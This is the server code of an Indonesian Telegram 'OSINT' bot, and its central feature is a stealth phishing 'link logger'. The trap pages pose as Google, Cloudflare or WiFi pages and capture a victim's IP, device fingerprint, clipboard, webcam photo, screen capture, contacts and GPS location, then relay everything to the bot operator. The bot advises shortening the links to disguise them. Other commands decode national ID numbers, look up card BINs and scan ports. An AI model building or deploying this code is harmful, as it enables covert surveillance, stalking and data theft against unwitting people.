import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dns from "dns";
import util from "util";
import { Telegraf, Markup } from "telegraf";
import net from "net";
import crypto from "crypto";
import fs from "fs";
import { templates } from "./trapTemplates";

const resolveMx = util.promisify(dns.resolveMx);

// Timeout helper for fetch
const fetchWithTimeout = async (url: string, options: RequestInit = {}, timeoutMs: number = 4000) => {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const response = await fetch(url, { ...options, signal: controller.signal });
    clearTimeout(id);
    return response;
  } catch (error) {
    clearTimeout(id);
    throw error;
  }
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Stateless Trap ID Generation & Validation
  const generateTrapId = (chatId: number) => {
    return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
  };

  const getChatIdFromTrapId = (trapId: string): number | null => {
    try {
      const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
      if (decoded.includes('-OSINT-')) {
        const idStr = decoded.split('-OSINT-')[0];
        return parseInt(idStr, 10);
      }
      return null;
    } catch {
      return null;
    }
  };

  // Default to the current AI Studio Dev URL. It will automatically update to Shared URL when someone visits it.
  let appHost = process.env.VITE_APP_URL || "https://ais-dev-wgiyctmskpzuuihqjrqsoy-125749415297.asia-southeast1.run.app";

  const escapeHTML = (text: string) => {
    return text.replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#039;'
    }[m] || m));
  };

  // Initialize bot only once if token exists
  const botInstance = process.env.TELEGRAM_BOT_TOKEN ? new Telegraf(process.env.TELEGRAM_BOT_TOKEN) : null;

  app.use(express.json({ limit: '15mb' }));

  app.use((req, res, next) => {
    // Attempt to capture public URL
    const hostObj = req.headers['x-forwarded-host'] || req.headers.host;
    if (hostObj) {
      const hostStr = Array.isArray(hostObj) ? hostObj[0] : hostObj;
      if (hostStr.includes('.run.app') || hostStr.includes('.railway.app')) {
        const protocol = req.headers['x-forwarded-proto'] || 'https';
        appHost = `${protocol}://${hostStr}`;
      }
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // ... (previous API routes continue here)
  
  // ========== IP LOGGER & CAMPHISH TRAP ENDPOINTS ==========
  app.get('/t/:tmplId/:id', (req, res) => {
    const { id, tmplId } = req.params;
    const chatId = getChatIdFromTrapId(id);
    if (!chatId) return res.status(404).send('<h2>Error 404: Link Invalid or Expired.</h2>');

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    if (botInstance) {
      const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      
      let msg = `🚩 <b>TARGET REACHED THE TRAP!</b> 🚩\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `📅 <b>Waktu:</b> <code>${timestamp} WIB</code>\n` +
                `🌐 <b>IP Address:</b> <code>${escapeHTML(String(ip))}</code>\n` +
                `📁 <b>Template:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
                `🖥️ <b>User-Agent:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `⏳ <i>Menunggu sinkronisasi hardware & GPS...</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
    }

    const template = templates[tmplId] || templates['1'];
    res.send(template.render(id));
  });

  // Backward compatibility alias
  app.get('/t/:id', (req: any, res) => {
    req.params.tmplId = '1';
    app._router.handle(req, res, () => {});
  });

  // Handle Device Metadata Upload
  app.post('/api/log/:id/info', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      const tmplId = data.tmplId || '1';
      const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
      
      let header = '🕵️‍♂️ <b>SYSTEM AUDIT: IDENTITY CAPTURED</b>';
      let status = '🔄 <i>Target sedang memproses izin tambahan...</i>';

      if (tmplId === 'google') {
        header = '🛡️ <b>GOOGLE_SECURITY: ACCESS GRANTED</b>';
      } else if (tmplId === 'pegasus') {
        header = '💀 <b>PEGASUS_V5: KERNEL_BREACH_SUCCESS</b>';
        status = '🔥 <i>Status: Deep Scan Hardware Aktif.</i>';
      } else if (tmplId === 'file') {
        header = '📂 <b>FILE_TRANSFER: ACCESS_KEY_CAPTURED</b>';
      }

      let msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `📋 <b>TEMPLATE INFO</b>\n` +
                  `├ Name: <code>${escapeHTML(templateName)}</code>\n` +
                  `└ Flow: <code>Advanced Audit</code>\n\n` +
                  `🖥️ <b>HARDWARE SPECS</b>\n` +
                  `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                  `├ Browser: <code>${escapeHTML(data.vendor || 'N/A')} (${data.onLine ? 'Online' : 'Offline'})</code>\n` +
                  `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
                  `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
                  `├ GPU: <code>${escapeHTML(data.gpu || 'N/A')}</code>\n` +
                  `├ VM Status: <code>${escapeHTML(data.vmStatus || 'N/A')}</code>\n` +
                  `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
                  `🔋 <b>ENERGY & PERF</b>\n` +
                  `├ Battery: <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
                  `├ Connect: <code>${escapeHTML(data.connection || 'N/A')}</code>\n` +
                  `├ Refresh: <code>${escapeHTML(data.refreshRate || 'Verified')}</code>\n` +
                  `└ Gamut: <code>${escapeHTML(data.gamut || 'N/A')}</code>\n\n` +
                  `🌍 <b>REGION & ENV</b>\n` +
                  `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                  `├ Langs: <code>${escapeHTML(data.langs || 'N/A')}</code>\n` +
                  `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `${status}`;

      botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
    }
    res.sendStatus(200);
  });

  // Handle Extra Data (Clipboard, Media, Screen, etc)
  app.post('/api/log/:id/extra', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const data = req.body as any;
      let extraMsg = `📎 <b>ADVANCED MODULE CAPTURED</b> 📎\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n`;
      
      if (data.hardware_brand_profile) {
        try {
          const h = JSON.parse(data.hardware_brand_profile);
          extraMsg += `🛠️ <b>HARDWARE IDENTITY:</b>\n` +
                      `├ Brand/Model: <code>${escapeHTML(h.model || 'N/A')}</code>\n` +
                      `├ Form: <code>${escapeHTML(h.formFactor || 'N/A')}</code>\n` +
                      `└ Arch: <code>${escapeHTML(h.architecture || 'N/A')}</code>\n\n`;
        } catch(e) {}
      }
      if (data.cpu_compute_score) {
        extraMsg += `⚡ <b>CPU PERFORMANCE:</b>\n` +
                    `└ Score: <code>${data.cpu_compute_score}</code>\n\n`;
      }
      if (data.local_ip) {
        extraMsg += `🌐 <b>WEB-RTC LOCAL IP:</b>\n` +
                    `└ IP: <code>${data.local_ip}</code>\n\n`;
      }
      if (data.clipboard_sync || data.clipboard) {
        extraMsg += `📋 <b>CLIPBOARD DUMP:</b>\n<pre>${escapeHTML(data.clipboard_sync || data.clipboard)}</pre>\n\n`;
      }
      if (data.media_hardware) {
        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media_hardware)}</pre>\n\n`;
      }
      if (data.file_name) {
        extraMsg += `📂 <b>FILE ACCESS GRANTED:</b>\n` +
                    `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
                    `├ Type: <code>${data.file_type}</code>\n` +
                    `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
      }
      if (data.screen_label) {
        extraMsg += `🖥️ <b>SCREEN INTERFACE LOGGED:</b>\n` +
                    `├ Source: <code>${escapeHTML(data.screen_label)}</code>\n` +
                    `└ Status: <b>Sync Success</b>\n\n`;
      }
      
      // Image delivery (Visual Identity, Screen Capture)
      if (data.screen_capture) {
        const buffer = Buffer.from(data.screen_capture.split(',')[1], 'base64');
        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `🖥️ SCREEN SNAPSHOT CAPTURED` }).catch(() => {});
      }
      if (data.visual_identity) {
        const buffer = Buffer.from(data.visual_identity.split(',')[1], 'base64');
        botInstance.telegram.sendPhoto(chatId, { source: buffer }, { caption: `📸 TARGET VISUAL IDENTITY` }).catch(() => {});
      }

      if (data.gpu_full_profile) {
        try {
          const gpu = JSON.parse(data.gpu_full_profile);
          extraMsg += `🎮 <b>ADVANCED GPU PROFILE:</b>\n` +
                      `├ Vendor: <code>${escapeHTML(gpu.vendor)}</code>\n` +
                      `├ Renderer: <code>${escapeHTML(gpu.renderer)}</code>\n` +
                      `├ GL Version: <code>${escapeHTML(gpu.gl_version)}</code>\n` +
                      `└ Shading GL: <code>${escapeHTML(gpu.shading_lang)}</code>\n\n`;
        } catch(e) {}
      }

      if (data.battery_level) {
        extraMsg += `🔋 <b>POWER SUBSYSTEM:</b>\n` +
                    `├ Level: <code>${data.battery_level}</code>\n` +
                    `├ Charging: <code>${data.battery_charging ? 'YES' : 'NO'}</code>\n` +
                    `└ Time to Empty: <code>${data.battery_time}</code>\n\n`;
      }

      if (data.fonts_count) {
        extraMsg += `🔡 <b>FONT REGISTRY:</b>\n` +
                    `├ Count: <code>${data.fonts_count}</code>\n` +
                    `└ Samples: <code>${escapeHTML(data.fonts_sample)}</code>\n\n`;
      }

      if (data.screens) {
        extraMsg += `🖥️ <b>MULTI-DISPLAY MAP:</b>\n` +
                    `├ Screens: <code>${data.screens}</code>\n` +
                    `└ Primary: <code>${escapeHTML(data.screen_primary || 'N/A')}</code>\n\n`;
      }

      if (data.sec_pdf !== undefined) {
        extraMsg += `🛡️ <b>KERNEL INTEGRITY+:</b>\n` +
                    `├ Webdriver: <code>${data.sec_webdriver}</code>\n` +
                    `├ PDF Enabled: <code>${data.sec_pdf}</code>\n` +
                    `└ DoNotTrack: <code>${data.sec_doNotTrack || 'Off'}</code>\n\n`;
      }
      if (data.installed_fonts) {
        extraMsg += `🔡 <b>FONT FINGERPRINT:</b>\n` +
                    `└ Detected: <code>${data.installed_fonts}</code>\n\n`;
      }

      if (data.audio_sig) {
        extraMsg += `🎵 <b>AUDIO FINGERPRINT:</b>\n` +
                    `└ Signature: <code>${data.audio_sig}</code>\n\n`;
      }

      if (data.orientation) {
        extraMsg += `📱 <b>PERIPHERAL & LANG:</b>\n` +
                    `├ Orientation: <code>${data.orientation}</code>\n` +
                    `├ Gamepads: <code>${data.gamepads}</code>\n` +
                    `└ Languages: <code>${data.languages}</code>\n\n`;
      }

      const apis = ['api_bluetooth', 'api_usb', 'api_hid', 'api_serial', 'api_midi', 'api_idle', 'api_contacts', 'api_wake', 'api_storage'];
      let apiFound = false;
      let apiTxt = `🧱 <b>HARDWARE API ACCESS:</b>\n`;
      apis.forEach(k => {
        if (data[k] !== undefined) {
          apiFound = true;
          apiTxt += `${data[k] ? '✅' : '❌'} ${k.replace('api_', '').toUpperCase()}\n`;
        }
      });
      if (apiFound) extraMsg += apiTxt + '\n';

      if (data.social_active || data.social_inactive) {
         extraMsg += `🤝 <b>SOCIAL PRESENCE:</b>\n` +
                     `├ Active: <code>${data.social_active || 'None'}</code>\n` +
                     `└ Load: <code>${data.load_ms || 'N/A'}ms</code>\n\n`;
      }
      if (data.adblock_detected !== undefined) {
        extraMsg += `🛡️ <b>ADS/SHIELD STATUS:</b>\n` +
                    `└ AdBlock: <b>${data.adblock_detected ? 'DETECTED' : 'NOT FOUND'}</b>\n\n`;
      }
      if (data.network_rtt) {
        extraMsg += `🛰️ <b>LATENCY MAPPING:</b>\n` +
                    `├ Node: <code>${data.network_rtt}</code>\n` +
                    `└ RTT: <code>${data.latency}ms</code>\n\n`;
      }

      if (data.contacts_leaked) {
        let count = 0;
        try { count = JSON.parse(data.contacts_leaked).length; } catch(e) {}
        extraMsg += `👥 <b>SOCIAL GRAPH CAPTURED:</b>\n` +
                    `└ <i>${count} kontak diekstrak (Raw Logged).</i>\n\n`;
      }
      if (data.sensor_mag || data.sensor_lux) {
        extraMsg += `🧬 <b>PHYSICAL ENVIRONMENT:</b>\n` +
                    `├ Mag: <code>${escapeHTML(data.sensor_mag || 'N/A')}</code>\n` +
                    `└ Ambient: <code>${escapeHTML(String(data.sensor_lux || 'N/A'))} lux</code>\n\n`;
      }
      if (data.storage_mb) {
        extraMsg += `💾 <b>STORAGE FORENSICS:</b>\n` +
                    `├ Usage: <code>${data.storage_mb} MB</code>\n` +
                    `└ Quota: <code>${data.quota_gb} GB</code>\n\n`;
      }
      
      if (data.incognito_audit !== undefined) {
        extraMsg += `🕵️ <b>BROWSER MODE:</b>\n` +
                    `└ Private/Incognito: <b>${data.incognito_audit ? 'YES' : 'NO'}</b>\n\n`;
      }
      if (data.devtools_open !== undefined) {
        extraMsg += `🛠️ <b>INSPECTOR DETECTED:</b>\n` +
                    `└ Developer Tools: <b>${data.devtools_open ? 'OPEN' : 'CLOSED'}</b>\n\n`;
      }
      if (data.sec_webdriver !== undefined) {
        extraMsg += `🛡️ <b>KERNEL SECURITY:</b>\n` +
                    `├ WebDriver: <code>${data.sec_webdriver}</code>\n` +
                    `├ Cookies: <code>${data.sec_cookies}</code>\n` +
                    `└ Java: <code>${data.sec_java}</code>\n\n`;
      }
      
      if (data.net_effective) {
        extraMsg += `🌐 <b>NETWORK LAYER ANALYTICS:</b>\n` +
                    `├ Type: <code>${data.net_effective}</code>\n` +
                    `├ RTT: <code>${data.net_rtt}ms</code>\n` +
                    `├ Downlink: <code>${data.net_downlink}Mb/s</code>\n` +
                    `└ Beacon RTT: <code>${data.beacon_rtt || 'N/A'}</code>\n\n`;
      }
      if (data.storage_ls || data.storage_ss) {
        extraMsg += `📂 <b>PERSISTENT DATA MAP:</b>\n` +
                    `├ LocalStorage: <i>${data.storage_ls ? 'Captured' : 'Empty'}</i>\n` +
                    `└ SessionStorage: <i>${data.storage_ss ? 'Captured' : 'Empty'}</i>\n\n`;
      }
      if (data.bt_available !== undefined) {
        extraMsg += `📡 <b>PERIPHERAL BUS:</b>\n` +
                    `└ BT Adapter: <b>${data.bt_available ? 'Active' : 'Offline'}</b>\n\n`;
      }
      if (data.display_hz) {
        extraMsg += `📺 <b>DISPLAY PERFORMANCE:</b>\n` +
                    `└ Refresh Rate: <code>${data.display_hz} Hz</code>\n\n`;
      }
      if (data.haptic_ready) {
        extraMsg += `📳 <b>HAPTIC RESPONSE:</b>\n` +
                    `└ Engine: <b>Verified & Calibrated</b>\n\n`;
      }
      
      extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
                  `✅ <i>Hyper-Deep module sync successfully.</i>`;
      botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
    }
    res.sendStatus(200);
  });

  app.post('/api/log/:id/gps', (req, res) => {
    const id = req.params.id;
    const chatId = getChatIdFromTrapId(id);
    if (botInstance && chatId) {
      const { lat, lon, acc, tmplId } = req.body;
      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
      
      let header = '📍 <b>GPS_FIX: TARGET_LOCATED</b>';
      if (tmplId === 'google') {
        header = '⚡ <b>TRUSTED_LOCATION_SYNC</b>';
      } else if (tmplId === 'maps') {
        header = '🗺️ <b>MAPS_PRECISION_COORDINATES</b>';
      }

      const msg = `<b>${header}</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🛰️ <b>COORDINATES</b>\n` +
                  `├ Lat: <code>${lat}</code>\n` +
                  `├ Lon: <code>${lon}</code>\n` +
                  `└ Acc: <code>${acc} meter</code>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🔗 <b>NAVIGATION LINK</b>\n` +
                  `🌐 <a href="${mapLink}">Lihat Lokasi di Google Maps</a>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `🏁 <i>Status: Verifikasi Spasial Berhasil.</i>`;

      botInstance.telegram.sendMessage(chatId, msg, { 
        parse_mode: 'HTML', 
        link_preview_options: { is_disabled: true }
      }).catch(console.error);
    }
    res.sendStatus(200);
  });
  // ==============================================

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use((req, res, next) => {
      // Don't intercept /t or /api
      if (req.path.startsWith('/t/') || req.path.startsWith('/api')) {
        return next();
      }
      vite.middlewares(req, res, next);
    });
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res, next) => {
      // Avoid sending index.html for api or /t routes by letting them fall through
      if (req.path.startsWith('/api') || req.path.startsWith('/t/')) {
        return next();
      }
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  // TELEGRAM BOT SETUP
  if (process.env.TELEGRAM_BOT_TOKEN) {
    const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);

    const startMsgText = `<b>🤖 TRIHEXA_666: ULTIMATE OSINT TERMINAL</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Selamat datang di hub intelijen publik. Gunakan menu di bawah untuk mengakses modul pelacakan, analisis data, dan alat investigasi digital.\n\n` +
                         `<i>"Silent tracking, precise results."</i>\n` +
                         `━━━━━━━━━━━━━━━━━━━━`;
    
    const mainKeyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🇮🇩 OSINT Indonesia', 'menu_osint_basic'), Markup.button.callback('📡 Global OSINT', 'menu_osint_adv')],
      [Markup.button.callback('🛠️ Advanced Tools', 'menu_tools'), Markup.button.callback('🎣 LINK LOGGER', 'menu_logger')],
      [Markup.button.callback('🎲 Fun & Random', 'menu_fun'), Markup.button.callback('ℹ️ Help & Info', 'menu_help')]
    ]);

    bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));

    bot.action('menu_main', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      ctx.editMessageText(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }).catch(() => {});
    });

    bot.action('menu_osint_basic', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🇮🇩 LOCAL OSINT MODULE (ID)</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• <b>/nik [nomor]</b>\n  └ <i>KTP Identity Analytics & Regional Mapping.</i>\n\n` +
        `• <b>/plat [nomor]</b>\n  └ <i>Vehicle Registration Area Identification.</i>\n\n` +
        `• <b>/ip [target]</b>\n  └ <i>Deep IP Geolocation & Network Intelligence.</i>\n\n` +
        `• <b>/email [email]</b>\n  └ <i>SMTP MX Validator & Deliverability Check.</i>\n\n` +
        `• <b>/username [user]</b>\n  └ <i>Social Footprint Mapping (75+ Platforms).</i>\n\n` +
        `• <b>/whois [domain]</b>\n  └ <i>Domain Administrative Reconnaissance.</i>\n\n` +
        `• <b>/dns [domain]</b>\n  └ <i>Zone Enumeration & DNS Record Mapping.</i>\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_osint_adv', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>📡 GLOBAL RECON MODULE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• <b>/headers [url]</b>\n  └ <i>Security Header Audit & Response Analysis.</i>\n\n` +
        `• <b>/dork [keyword]</b>\n  └ <i>Advanced Google Dorks Link Engine.</i>\n\n` +
        `• <b>/bininfo [bin]</b>\n  └ <i>Credit Card Issuer & Tier Analytics.</i>\n\n` +
        `• <b>/subdomain [domain]</b>\n  └ <i>Infrastructure Layer Subdomain Recon.</i>\n\n` +
        `• <b>/github_user [user]</b>\n  └ <i>Detailed GitHub Profile Metadata Extraction.</i>\n\n` +
        `• <b>/port [ip] [port]</b>\n  └ <i>Network Entry-Point Port Scanner.</i>\n\n` +
        `• <b>/phone_dork [nomor]</b>\n  └ <i>Phone Trackers & Mobile Asset OSINT.</i>\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_tools', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🛠️ ADVANCED UTILITIES</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• <b>/qr [teks]</b>\n  └ <i>Generate QR Code (PNG via API).</i>\n\n` +
        `• <b>/shortlink [url]</b>\n  └ <i>Persingkat URL panjang (is.gd hook).</i>\n\n` +
        `• <b>/pwd [panjang]</b>\n  └ <i>Buat password dengan entropy tinggi.</i>\n\n` +
        `• <b>/b64enc | /b64dec</b>\n  └ <i>Konversi teks ke/dari Base64.</i>\n\n` +
        `• <b>/hash [teks]</b>\n  └ <i>Buat checksum MD5 & SHA256 sekaligus.</i>\n\n` +
        `• <b>/uuid</b>\n  └ <i>Generate Unique ID v4 acak.</i>\n\n` +
        `• <b>/weather [kota]</b>\n  └ <i>Data cuaca dari wttr.in (Real-time).</i>\n\n` +
        `• <b>/crypto_price [koin]</b>\n  └ <i>Cek harga aset kripto (Market Data API).</i>\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_fun', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>🎲 FUN & RANDOM MODULE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `• <b>/flip</b> | <b>/roll</b>\n  └ <i>Tools keberuntungan (Koin & Dadu).</i>\n\n` +
        `• <b>/meme | /joke | /quote</b>\n  └ <i>Konten hiburan random (Global API).</i>\n\n` +
        `• <b>/fact</b>\n  └ <i>Kumpulan fakta unik secara acak.</i>\n\n` +
        `• <b>/cat</b> | <b>/dog</b>\n  └ <i>Eksibisi visual hewan peliharaan.</i>\n` +
        `━━━━━━━━━━━━━━━━━━━━`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.action('menu_logger', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const id = generateTrapId(ctx.chat!.id);
      let msg = `<b>🎣 STEALTH LINK LOGGER v5.2</b>\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `Pilih template operasional berikut:\n\n`;
      
      const tmplDesc: Record<string, string> = {
        'google': '└ <i>System Identity Ecosystem. Audit hardware-bus, high-entropy regional & display patterns.</i>',
        'gallery': '└ <i>Deep Forensic Registry. Media telemetry, storage mapping & social-graph extraction.</i>',
        'cloudflare': '└ <i>Edge Verification 6.0. Precision fingerprinting, RTT-latency mapping & sensor audit.</i>',
        'pegasus': '└ <i>Kernel Intelligence v9. Elite audio-sig, font-profiling & ring-0 hardware diagnostics.</i>',
        'wifi': '└ <i>Elite Enterprise Auth. Social-presence triangulation & network forensic mapping.</i>',
        'recap': '└ <i>Ghost Recon Protocol. Multi-layered background telemetry extraction (Silent-mode).</i>'
      };

      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        msg += `📦 <b>${tmpl.name}</b>\n${tmplDesc[key] || ''}\n🔗 <code>${trapUrl}</code>\n\n`;
      });

      msg += `━━━━━━━━━━━━━━━━━━━━\n` +
             `💡 <b>ALATZ:</b> Browser & IP dideteksi otomatis. Module <b>Advanced</b> (GPS, Cam, Files) terkirim jika target mengizinkan akses di halaman.\n\n` +
             `⚠️ <i>Saran: Gunakan layanan pemendek URL untuk hasil maksimal.</i>`;
      
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(msg, {
        parse_mode: 'HTML',
        link_preview_options: { is_disabled: true },
        ...kb
      }).catch(() => {});
    });

    bot.action('menu_help', (ctx) => {
      ctx.answerCbQuery().catch(() => {});
      const txt = `<b>ℹ️ TERMINAL INFO & HELP</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `Dibuat untuk tujuan edukasi investigasi digital (OSINT).\n\n` +
        `<b>Host Aktif:</b> <code>${appHost}</code>\n` +
        `<b>Status Bot:</b> Online ✅\n\n` +
        `Gunakan perintah <code>/sethost</code> jika link logger tidak bisa dibuka (Masalah IP Publink).`;
      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ Kembali', 'menu_main')]]);
      ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
    });

    bot.command('nik', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /nik 3201010101900001");
      const nik = args[1];

      if (!/^\d{16}$/.test(nik)) {
        return ctx.reply("❌ NIK harus terdiri dari 16 digit angka.");
      }

      const provMap: Record<string, string> = { "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat", "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan", "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung", "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat", "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur", "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat", "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat", "62": "Kalimantan Tengah", "63": "Kalimantan Selatan", "64": "Kalimantan Timur", "65": "Kalimantan Utara", "71": "Sulawesi Utara", "72": "Sulawesi Tengah", "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara", "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku", "82": "Maluku Utara", "91": "Papua Barat", "94": "Papua" };

      const prov = nik.substring(0, 2);
      const kab = nik.substring(2, 4);
      const kec = nik.substring(4, 6);
      let tgl = parseInt(nik.substring(6, 8), 10);
      const bln = nik.substring(8, 10);
      let thn = parseInt(nik.substring(10, 12), 10);
      const urut = nik.substring(12, 16);

      let jk = "Laki-laki 👨";
      if (tgl >= 40) {
        jk = "Perempuan 👩";
        tgl -= 40;
      }
      
      const currentYear = new Date().getFullYear() % 100;
      thn = thn > currentYear ? 1900 + thn : 2000 + thn;

      const provinsi = provMap[prov] || "Tidak diketahui";

      const reply = `<b>🇮🇩 DATA NIK DECODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📋 <b>NIK:</b> <code>${nik}</code>\n` +
                    `👤 <b>Gender:</b> ${jk}\n` +
                    `📅 <b>Lahir:</b> <code>${tgl.toString().padStart(2, '0')}-${bln}-${thn}</code>\n` +
                    `📍 <b>Wilayah:</b>\n` +
                    `├ Provinsi: ${provinsi}\n` +
                    `├ Kode Kab: ${kab}\n` +
                    `└ Kode Kec: ${kec}\n` +
                    `🔢 <b>No Urut:</b> ${urut}\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Analisis selesai.</i>`;

      ctx.reply(reply, { parse_mode: 'HTML' });
    });

    bot.command('plat', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /plat B 1234 ABC atau /plat B1234ABC");
      
      const platInput = args.slice(1).join('').toUpperCase();
      const match = platInput.match(/^([A-Z]{1,2})(\d{1,4})([A-Z]{0,3})$/);
      
      if (!match) return ctx.reply("❌ Format plat nomor tidak valid.");
      
      const platMap: Record<string, string> = { "A": "Banten", "B": "DKI Jakarta, Depok, Tangerang, Bekasi", "D": "Bandung, Cimahi", "E": "Cirebon, Indramayu, Majalengka, Kuningan", "F": "Bogor, Sukabumi, Cianjur", "T": "Purwakarta, Karawang, Subang", "Z": "Garut, Tasikmalaya, Sumedang, Ciamis, Banjar", "G": "Pekalongan, Tegal, Brebes, Batang, Pemalang", "H": "Semarang, Salatiga, Kendal, Demak", "K": "Pati, Kudus, Jepara, Rembang, Blora, Grobogan", "R": "Banyumas, Cilacap, Purbalingga, Banjarnegara", "AA": "Magelang, Purworejo, Kebumen, Temanggung, Wonosobo", "AD": "Surakarta, Sukoharjo, Boyolali, Klaten, Karanganyar, Wonogiri, Sragen", "AB": "DI Yogyakarta", "L": "Surabaya", "M": "Madura", "N": "Malang, Probolinggo, Pasuruan, Lumajang", "P": "Besi, Situbondo, Bondowoso, Jember, Banyuwangi", "S": "Bojonegoro, Mojokerto, Tuban, Lamongan, Jombang", "W": "Sidoarjo, Gresik", "AE": "Madiun, Ngawi, Magetan, Ponorogo, Pacitan", "AG": "Kediri, Blitar, Tulungagung, Nganjuk, Trenggalek", "DK": "Bali", "DR": "Lombok", "EA": "Sumbawa", "DH": "Timor", "EB": "Flores", "ED": "Sumba", "KB": "Kalimantan Barat", "DA": "Kalimantan Selatan", "KH": "Kalimantan Tengah", "KT": "Kalimantan Timur", "KU": "Kalimantan Utara", "DB": 